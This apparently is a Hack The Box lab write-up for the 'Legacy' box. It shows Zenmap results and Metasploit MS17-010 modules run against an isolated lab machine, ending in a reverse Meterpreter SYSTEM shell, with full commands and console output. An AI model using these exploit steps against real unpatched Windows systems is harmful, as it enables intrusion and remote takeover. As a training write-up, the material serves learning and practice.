@@ -1,0 +1,174 @@
+Well, Legacy, Second easiest box. Lets get this over with, shall we?
+ 
+Step one, yeet that IP into Zenmap, and run a "Intense scan, all TCP ports" profile on it. I choose TCP (Because I'm a scrub) 
+Because the difficulty matrix on this machine indicates that CVE plays a very important factor. 
+And when there are CVE exploits, more often than not there are Metasploit modules that you can use. 
+And it should go without saying, that Metasploit modules are very fun to use.
+ 
+The scan should take less than 10 minutes to complete, but when it finishes, check out the services tab, 
+and that should give us our start.
+ 
+Port   Protocol   State   Version
+445    tcp        open    Windows XP microsoft-ds
+3389   tcp        closed  N/A
+139    tcp        open    Microsoft Windows netbios-ssn
+ 
+Well, we have 2 open ports, and 1 closed port. This should be relatively easy to work with. As a start, let's look up some 
+potential exploits for that service running on port 455.
+ 
+After a bit of google-fu, I stumble upon a Rapid7 page for "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption." *1 
+Which makes me very excited.
+ 
+For those of you that don't know, EternalBlue was an exploit created by the NSA (National Security Agency) to target Windows XP Machines. 
+It was leaked sometime around 2017, and was the leading reason behind why the Ransomware Wannacry/Wannacrypt spread so quickly. 
+Microsoft actually released a patch for this exploit despite ending all support for Windows XP in 2014 because of how destructive 
+this exploit was. For a bit of context, Wannacry completely shut down the NHS (National Health Service) for the United Kingdom, 
+resulting in around 92M GBP in damages and a screeching halt to systems all across the organization *2. 
+Not fun, especially when the kill switch was an unregistered domain *3. Sorry if I'm rambling, before I got into cyber security 
+and started using hackthebox, I followed this ransomware and the subsequent take down of it pretty closely. 
+So using something EternalBlue is a mix of nostalgia and excitement for me. But I'm rambling again.
+ 
+Throwing the search term "eternalblue" into the msfconsole leads us to 5 modules that we can potentially use.
+ 
+msf5 > search eternalblue
+ 
+Matching Modules
+================
+ 
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+ 
+Module #2 (Not to be confused with #1. Yes I am starting at 0 like an array) seems to be rather hopeful. For obvious reason, #0 and #1 wont work because we're trying to exploit the system. And #3 won't work because this is a Windows XP machine. However, let's not rule out #4 just yet. For now we'll try #2
+ 
+msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
+ 
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+ 
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target address range or CIDR identifier
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+ 
+ 
+Exploit target:
+ 
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+ 
+The exploit target is for Windows 7 and Windows Server 2008. This probably won't work, but it doesn't hurt to test it out.
+ 
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.10.4
+rhost => 10.10.10.4
+msf5 exploit(windows/smb/ms17_010_eternalblue) > run
+ 
+[*] Started reverse TCP handler on 10.10.14.8:4444
+[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1
+[*] 10.10.10.4:445 - Connecting to target for exploitation.
+[+] 10.10.10.4:445 - Connection established for exploitation.
+[+] 10.10.10.4:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.4:445 - CORE raw buffer dump (11 bytes)
+[*] 10.10.10.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31                 Windows 5.1    
+[+] 10.10.10.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.4:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.4:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.4:445 - Starting non-paged pool grooming
+[+] 10.10.10.4:445 - Sending SMBv2 buffers
+[+] 10.10.10.4:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.4:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.4:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.4:445 - Receiving response from exploit packet
+[+] 10.10.10.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.4:445 - Sending egg to corrupted connection.
+[*] 10.10.10.4:445 - Triggering free of corrupted buffer.
+[-] 10.10.10.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.10.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 10.10.10.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 10.10.10.4:445 - Connecting to target for exploitation.
+[-] 10.10.10.4:445 - Could not make SMBv1 connection
+[*] Exploit completed, but no session was created.
+ 
+Yeah, I expected that much. It's a shame but it does give us some valuable information, 
+the system is probably vulnerable to MS17-010. So in responce, lets try module #4 on our list.
+ 
+msf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms17_010_psexec
+msf5 exploit(windows/smb/ms17_010_psexec) > show options
+ 
+Module options (exploit/windows/smb/ms17_010_psexec):
+ 
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target address range or CIDR identifier
+   RPORT                 445                                                             yes       The Target port
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+ 
+ 
+Exploit target:
+ 
+   Id  Name
+   --  ----
+   0   Automatic
+ 
+ 
+msf5 exploit(windows/smb/ms17_010_psexec) > set rhost 10.10.10.4
+rhost => 10.10.10.4
+msf5 exploit(windows/smb/ms17_010_psexec) > run
+ 
+[*] Started reverse TCP handler on 10.10.14.8:4444
+[*] 10.10.10.4:445 - Target OS: Windows 5.1
+[*] 10.10.10.4:445 - Filling barrel with fish... done
+[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 10.10.10.4:445 -    [*] Preparing dynamite...
+[*] 10.10.10.4:445 -        [*] Trying stick 1 (x86)...Boom!
+[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
+[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
+[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x82014bd8
+[*] 10.10.10.4:445 - Built a write-what-where primitive...
+[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.4:445 - Selecting native target
+[*] 10.10.10.4:445 - Uploading payload... TGOUVJeB.exe
+[*] 10.10.10.4:445 - Created \TGOUVJeB.exe...
+[+] 10.10.10.4:445 - Service started successfully...
+[*] Sending stage (179779 bytes) to 10.10.10.4
+[*] 10.10.10.4:445 - Deleting \TGOUVJeB.exe...
+[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.4:1028) at 2019-12-17 11:16:15 -0600
+ 
+meterpreter >
+ 
+well, look at that, by using the EternalBlue exploit, we managed to open a shell in our target system. 
+From here on out it should be clear sailing.
+ 
+As is customary, the flag for root pwn can be found in the desktop folder of the admin user. 
+The flag for the user pwn can be found under the user "john."
+ 
+Overall this box was very fun. While it is one of the easier boxes that HTB hosts, 
+it was much fun finally using Eternalblue after reading about it so much a couple years ago.
+ 
+Sources:
+ 
+*1 https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue
+ 
+*2 https://www.telegraph.co.uk/technology/2018/10/11/wannacry-cyber-attack-cost-nhs-92m-19000-appointments-cancelled/
+ 
+*3 https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/
